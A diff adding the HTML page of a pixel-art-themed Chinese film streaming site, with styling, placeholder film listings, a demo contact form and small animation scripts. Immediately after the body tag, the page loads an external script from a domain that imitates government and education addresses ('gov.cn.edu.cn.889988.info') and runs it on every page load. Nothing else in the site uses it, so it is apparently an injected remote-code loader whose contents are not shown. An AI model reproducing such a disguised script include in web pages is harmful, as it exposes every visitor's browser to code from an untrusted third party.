@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>子子影视 — PIXEL VISION｜像素光影与高清影视在线观看</title>
+<meta name="description" content="子子影视（ziziyingshi-top）是一台像素风格的光影放映机：电影、剧集、动画、纪录片，游戏感片单每日更新，高清在线观看，复古不失真。">
+<meta name="keywords" content="子子影视, ziziyingshi-top, 像素影视, 像素光影, 游戏感片单, 高清在线观看, 电影剧集动画纪录片">
+<meta name="author" content="子子影视">
+<meta name="robots" content="index, follow">
+<style>
+  *{ margin:0; padding:0; box-sizing:border-box; }
+  :root{
+    --phos:#8fdc74;
+    --phos2:#5aa83f;
+    --dark:#1a2e1a;
+    --darker:#0f1c0f;
+    --bg:#0a120a;
+    --pixel:4px;
+    --soft:rgba(143,220,116,.55);
+  }
+  html{ -ms-text-size-adjust:100%; -webkit-text-size-adjust:100%; }
+  body{
+    background:var(--bg);
+    color:var(--phos);
+    font-family:"Courier New","Pixelated MS Sans Serif",Consolas,monospace;
+    line-height:1.85;
+    overflow-x:hidden;
+    image-rendering:pixelated;
+  }
+  /* 扫描线 */
+  body::after{ content:""; position:fixed; inset:0; z-index:999; pointer-events:none; opacity:.13;
+    background:repeating-linear-gradient(0deg, rgba(143,220,116,.35) 0 1px, transparent 1px 3px); }
+  /* 点阵网格背景 */
+  body::before{ content:""; position:fixed; inset:0; z-index:-1; opacity:.08; pointer-events:none;
+    background-image:
+      linear-gradient(var(--phos) 1px, transparent 1px),
+      linear-gradient(90deg, var(--phos) 1px, transparent 1px);
+    background-size:16px 16px; }
+  .wrap{ max-width:1000px; margin:0 auto; padding:0 20px; }
+
+  /* 像素边框工具 */
+  .pbox{ border:var(--pixel) solid var(--phos); padding:16px; position:relative; background:var(--darker); }
+  .pbox::before{ content:""; position:absolute; inset:3px; border:1px solid rgba(143,220,116,.25); pointer-events:none; }
+
+  /* 顶部 */
+  header{ border-bottom:var(--pixel) solid var(--phos); padding:16px 0; background:var(--darker); position:sticky; top:0; z-index:60; }
+  .nav{ display:flex; align-items:center; justify-content:space-between; gap:12px; flex-wrap:wrap; }
+  .brand{ display:flex; align-items:center; gap:12px; text-decoration:none; color:var(--phos); }
+  .cart{ width:44px; height:44px; background:var(--dark); border:var(--pixel) solid var(--phos); display:flex;
+    align-items:center; justify-content:center; font-size:22px; image-rendering:pixelated; }
+  .bname{ font-size:20px; font-weight:900; letter-spacing:1px; text-shadow:2px 2px 0 var(--phos2); }
+  .bname small{ display:block; font-size:9px; letter-spacing:3px; color:var(--soft); text-shadow:none; font-weight:400; }
+  .menu{ display:none; flex-direction:column; gap:4px; cursor:pointer; }
+  .menu span{ width:24px; height:3px; background:var(--phos); }
+  nav ul{ list-style:none; display:flex; gap:6px; flex-wrap:wrap; }
+  nav a{ text-decoration:none; color:var(--phos); font-size:13px; font-weight:700; letter-spacing:1px;
+    padding:7px 14px; border:2px solid transparent; }
+  nav a:hover{ border-color:var(--phos); background:var(--dark); }
+
+  /* 状态栏 */
+  .status{ display:flex; justify-content:space-between; font-size:11px; letter-spacing:1px; color:var(--soft);
+    border-bottom:2px dashed rgba(143,220,116,.4); padding-bottom:8px; margin-bottom:14px; flex-wrap:wrap; gap:8px; }
+  .hp{ color:var(--phos); }
+  .hp i{ font-style:normal; color:#ff5a5a; }
+
+  /* 首屏 */
+  .hero{ padding:44px 0 40px; }
+  .boot{ font-size:12px; letter-spacing:3px; color:var(--phos2); }
+  h1{ font-size:clamp(30px,7vw,60px); font-weight:900; letter-spacing:2px; line-height:1.15; margin:10px 0;
+    text-shadow:3px 3px 0 var(--phos2); }
+  .typewriter{ font-size:15px; color:var(--phos); min-height:1.5em; }
+  .typewriter::after{ content:"█"; animation:blink 1s step-end infinite; }
+  @keyframes blink{ 50%{ opacity:0; } }
+  .lead{ font-size:14px; color:var(--soft); max-width:600px; margin-top:14px; }
+  .bar{ margin-top:22px; }
+  .bar .lbl{ font-size:11px; letter-spacing:2px; color:var(--soft); margin-bottom:5px; }
+  .gauge{ height:16px; border:2px solid var(--phos); background:var(--darker); position:relative; }
+  .gauge span{ display:block; height:100%; background:var(--phos); width:0; }
+  .gauge b{ position:absolute; right:6px; top:-2px; font-size:11px; color:var(--phos); mix-blend-mode:difference; }
+
+  section.block{ padding:52px 0; border-top:var(--pixel) solid var(--phos); }
+  .head{ display:flex; align-items:baseline; gap:12px; margin-bottom:22px; flex-wrap:wrap; }
+  .head .no{ font-size:11px; color:var(--phos2); letter-spacing:2px; }
+  .head h2{ font-size:24px; font-weight:900; letter-spacing:2px; text-shadow:2px 2px 0 var(--phos2); }
+  .head .en{ font-size:10px; letter-spacing:3px; color:var(--soft); margin-left:auto; }
+
+  /* 数据 */
+  .stats{ display:grid; grid-template-columns:repeat(4,1fr); gap:12px; }
+  .stat{ border:2px solid var(--phos); background:var(--dark); padding:18px 8px; text-align:center; }
+  .stat b{ display:block; font-size:26px; font-weight:900; }
+  .stat span{ font-size:10px; letter-spacing:1px; color:var(--soft); }
+
+  /* 影片 */
+  .grid{ display:grid; grid-template-columns:repeat(auto-fill,minmax(205px,1fr)); gap:18px; }
+  .card{ border:2px solid var(--phos); background:var(--darker); padding:12px; transition:.15s; cursor:pointer; }
+  .card:hover{ background:var(--dark); transform:translateY(-3px); }
+  .cap{ height:170px; border:2px solid var(--phos); display:flex; align-items:center; justify-content:center;
+    font-size:44px; margin-bottom:10px; background:var(--bg); position:relative; }
+  .cap .lv{ position:absolute; top:6px; left:6px; font-size:9px; letter-spacing:1px; background:var(--phos);
+    color:var(--darker); padding:1px 6px; font-weight:900; }
+  .c1 .cap{ background:var(--dark); }
+  .card h3{ font-size:15px; font-weight:900; letter-spacing:1px; }
+  .card p{ font-size:11px; color:var(--soft); margin-top:4px; }
+  .pixel-line{ height:2px; background:repeating-linear-gradient(90deg,var(--phos) 0 6px, transparent 6px 10px);
+    margin:8px 0; }
+
+  /* 分类 */
+  .cats{ display:flex; flex-wrap:wrap; gap:8px; margin-bottom:22px; }
+  .pill{ font-size:12px; font-weight:700; letter-spacing:1px; padding:7px 15px; border:2px solid var(--phos); cursor:pointer; }
+  .pill:hover{ background:var(--phos); color:var(--darker); }
+
+  /* 关于 */
+  .about{ border:2px solid var(--phos); background:var(--darker); padding:24px; }
+  .about p{ font-size:14px; margin-bottom:12px; color:var(--phos); }
+  .about strong{ color:#fff; background:var(--phos2); padding:0 5px; }
+  .save{ margin-top:16px; border:2px dashed var(--phos); padding:14px 16px; font-size:13px; }
+
+  /* 留言 */
+  .form label{ display:block; font-size:11px; letter-spacing:2px; margin:14px 0 5px; color:var(--soft); }
+  .form input,.form textarea{ width:100%; padding:11px 13px; font:inherit; font-size:14px; background:var(--darker);
+    border:2px solid var(--phos); color:var(--phos); border-radius:0; }
+  .form input:focus,.form textarea:focus{ outline:none; background:var(--dark); }
+  .form button{ margin-top:20px; cursor:pointer; font:inherit; font-weight:900; letter-spacing:3px; font-size:13px;
+    padding:12px 30px; background:var(--phos); color:var(--darker); border:var(--pixel) solid var(--phos); }
+  .form button:hover{ background:var(--phos2); }
+
+  footer{ margin-top:24px; border-top:var(--pixel) solid var(--phos); padding:30px 0 20px; }
+  .foot-grid{ display:grid; grid-template-columns:repeat(4,1fr); gap:18px; margin:18px 0; padding-top:18px;
+    border-top:2px dashed rgba(143,220,116,.4); }
+  .foot-grid h6{ font-size:10px; letter-spacing:2px; color:var(--soft); margin-bottom:8px; }
+  .foot-grid a{ display:block; font-size:12px; color:var(--phos); text-decoration:none; margin-bottom:5px; }
+  .foot-grid a:hover{ text-decoration:underline; }
+  footer h5{ font-size:22px; font-weight:900; letter-spacing:2px; text-shadow:2px 2px 0 var(--phos2); }
+  footer .cred{ font-size:10px; letter-spacing:3px; color:var(--soft); margin-top:4px; }
+  footer p{ font-size:12px; color:var(--soft); margin:6px 0; }
+  footer a{ color:var(--phos); }
+  .blink-line{ animation:blink 1.4s step-end infinite; }
+
+  @media (max-width:760px){
+    .menu{ display:flex; }
+    nav{ position:absolute; top:76px; left:0; right:0; background:var(--darker); border-bottom:var(--pixel) solid var(--phos);
+      max-height:0; overflow:hidden; transition:.3s; }
+    nav.open{ max-height:400px; }
+    nav ul{ flex-direction:column; padding:14px; gap:6px; }
+    .stats{ grid-template-columns:repeat(2,1fr); }
+    .head .en{ margin-left:0; }
+    .foot-grid{ grid-template-columns:repeat(2,1fr); }
+  }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<header>
+  <div class="wrap nav">
+    <a href="#" class="brand">
+      <div class="cart">👾</div>
+      <div class="bname">子子影视<small>PIXEL VISION</small></div>
+    </a>
+    <div class="menu" onclick="document.getElementById('nav').classList.toggle('open')"><span></span><span></span><span></span></div>
+    <nav id="nav">
+      <ul>
+        <li><a href="#home">START</a></li>
+        <li><a href="#hot">STAGE 01</a></li>
+        <li><a href="#cats">INDEX</a></li>
+        <li><a href="#about">SYSTEM</a></li>
+        <li><a href="#contact">INPUT</a></li>
+      </ul>
+    </nav>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <section class="hero" id="home">
+    <div class="status">
+      <span>PLAYER : GUEST</span>
+      <span>LEVEL : 2024</span>
+      <span class="hp">HP <i>♥♥♥♥♥</i></span>
+      <span>COIN : 0</span>
+    </div>
+    <div class="boot">▶ BOOTING PIXEL VISION OS ... OK</div>
+    <h1>子子影视<br>PIXEL VISION</h1>
+    <div class="typewriter" id="type">正在加载片单数据……</div>
+    <p class="lead">子子影视（ziziyingshi-top）是一台像素风格的光影放映机。电影、剧集、动画、纪录片，游戏感片单每日更新，高清在线观看，复古不失真。</p>
+    <div class="bar">
+      <div class="lbl">LOADING — 片单载入进度</div>
+      <div class="gauge"><span id="loadbar"></span><b id="loadtxt">0%</b></div>
+    </div>
+  </section>
+
+  <section class="block" id="hot">
+    <div class="head"><span class="no">STAGE 01</span><h2>今日关卡</h2><span class="en">Now Showing</span></div>
+    <div class="stats">
+      <div class="stat"><b>9,200+</b><span>关卡总数</span></div>
+      <div class="stat"><b>1080P</b><span>画面解析度</span></div>
+      <div class="stat"><b>每日</b><span>更新存档</span></div>
+      <div class="stat"><b>0 COIN</b><span>免费观看</span></div>
+    </div>
+    <div class="grid" style="margin-top:26px;">
+      <div class="card"><div class="cap"><span class="lv">LV.8</span>🚀</div><h3>光年追猎</h3><p>科幻 / 2024 / 9.0</p><div class="pixel-line"></div></div>
+      <div class="card"><div class="cap"><span class="lv">LV.7</span>🕵️</div><h3>密码迷局</h3><p>悬疑 / 2024 / 8.7</p><div class="pixel-line"></div></div>
+      <div class="card"><div class="cap"><span class="lv">LV.9</span>🐬</div><h3>深蓝回声</h3><p>纪录片 / 2023 / 9.1</p><div class="pixel-line"></div></div>
+      <div class="card"><div class="cap"><span class="lv">LV.6</span>🔥</div><h3>午夜火线</h3><p>动作 / 2024 / 8.4</p><div class="pixel-line"></div></div>
+      <div class="card"><div class="cap"><span class="lv">LV.5</span>🌿</div><h3>十七号车站</h3><p>爱情 / 2024 / 8.2</p><div class="pixel-line"></div></div>
+      <div class="card"><div class="cap"><span class="lv">LV.4</span>🎤</div><h3>爆笑直播</h3><p>喜剧 / 2023 / 7.9</p><div class="pixel-line"></div></div>
+    </div>
+  </section>
+
+  <section class="block" id="cats">
+    <div class="head"><span class="no">STAGE 02</span><h2>关卡索引</h2><span class="en">Index</span></div>
+    <div class="cats">
+      <span class="pill">动作</span><span class="pill">科幻</span><span class="pill">悬疑</span>
+      <span class="pill">爱情</span><span class="pill">喜剧</span><span class="pill">动画</span>
+      <span class="pill">纪录片</span><span class="pill">恐怖</span><span class="pill">剧集</span><span class="pill">文艺</span>
+    </div>
+    <div class="grid">
+      <div class="card"><div class="cap">🎭</div><h3>舞台背后</h3><p>剧情 / 2023</p><div class="pixel-line"></div></div>
+      <div class="card"><div class="cap">🐉</div><h3>雾港龙鳞</h3><p>动画 / 2024</p><div class="pixel-line"></div></div>
+      <div class="card"><div class="cap">🛸</div><h3>平行之城</h3><p>科幻 / 2023</p><div class="pixel-line"></div></div>
+      <div class="card"><div class="cap">🏔️</div><h3>无人之境</h3><p>纪录片 / 2023</p><div class="pixel-line"></div></div>
+    </div>
+  </section>
+
+  <section class="block" id="about">
+    <div class="head"><span class="no">STAGE 03</span><h2>系统说明</h2><span class="en">System</span></div>
+    <div class="about">
+      <p><strong>子子影视</strong>（ziziyingshi-top）把看片当成一局好游戏：每一部片都是一个关卡，有难度、有彩蛋、有通关后的余味。我们不追排行榜，只挑那些值得你花两个小时的。</p>
+      <p>内容覆盖电影、剧集、动画、纪录片，主打高清在线观看、游戏感片单、少弹窗少套路。像素是外壳，内容才是本体。</p>
+      <div class="save">💾 SAVE DATA — 存档地址已写入：<strong>https://ziziyingshi-top.github.io</strong> &nbsp; <span class="blink-line">█</span></div>
+    </div>
+  </section>
+
+  <section class="block" id="contact">
+    <div class="head"><span class="no">STAGE 04</span><h2>输入指令</h2><span class="en">Input</span></div>
+    <div class="form">
+      <label>&gt; PLAYER NAME_</label>
+      <input type="text" placeholder="输入玩家名">
+      <label>&gt; CONTACT_</label>
+      <input type="text" placeholder="邮箱或联系方式（选填）">
+      <label>&gt; MESSAGE_</label>
+      <textarea rows="4" placeholder="推荐一部你反复看的片，或说说想解锁的关卡类型……"></textarea>
+      <button onclick="alert('指令已录入！静态演示页，部署后可接后端处理 🎮')">PRESS START ▶</button>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <h5>子子影视</h5>
+    <div class="cred">PIXEL VISION · 8-BIT CINEMA</div>
+    <p>电影 · 剧集 · 动画 · 纪录片 · 高清在线观看</p>
+    <p>网址：<a href="https://ziziyingshi-top.github.io">https://ziziyingshi-top.github.io</a></p>
+    <div class="foot-grid">
+      <div><h6>菜单</h6><a href="#home">START</a><a href="#hot">STAGE 01</a><a href="#cats">INDEX</a></div>
+      <div><h6>系统</h6><a href="#about">SYSTEM</a><a href="#contact">INPUT</a></div>
+      <div><h6>规格</h6><a href="#">单页站点</a><a href="#">移动端自适应</a></div>
+      <div><h6>备注</h6><a href="#">内链以 # 占位</a><a href="#">未生成 robots / sitemap</a></div>
+    </div>
+  </div>
+</footer>
+
+<script>
+  // 打字机
+  var txt=["正在加载片单数据……","已找到 9200+ 部影片……","解析度：1080P……","全部载入完成。按 START 开始 ▶"];
+  var ti=0, ci=0, tw=document.getElementById('type');
+  function typing(){
+    if(ci<txt[ti].length){ tw.textContent=txt[ti].slice(0,++ci); setTimeout(typing,38); }
+    else{ setTimeout(function(){ ti++; ci=0; if(ti<txt.length) typing(); else tw.textContent=txt[txt.length-1]; },700); }
+  }
+  typing();
+  // 进度条
+  var p=0, lb=document.getElementById('loadbar'), lt=document.getElementById('loadtxt');
+  (function lo(){
+    p+=Math.random()*6+1; if(p>100) p=100;
+    lb.style.width=p+'%'; lt.textContent=Math.floor(p)+'%';
+    if(p<100) setTimeout(lo,120);
+  })();
+  // 平滑滚动
+  document.querySelectorAll('a[href^="#"]').forEach(function(a){
+    a.addEventListener('click', function(e){
+      var id = this.getAttribute('href');
+      if(id.length > 1){
+        e.preventDefault();
+        var el = document.querySelector(id);
+        if(el) el.scrollIntoView({behavior:'smooth', block:'start'});
+        document.getElementById('nav').classList.remove('open');
+      }
+    });
+  });
+</script>
+</body>
+</html>
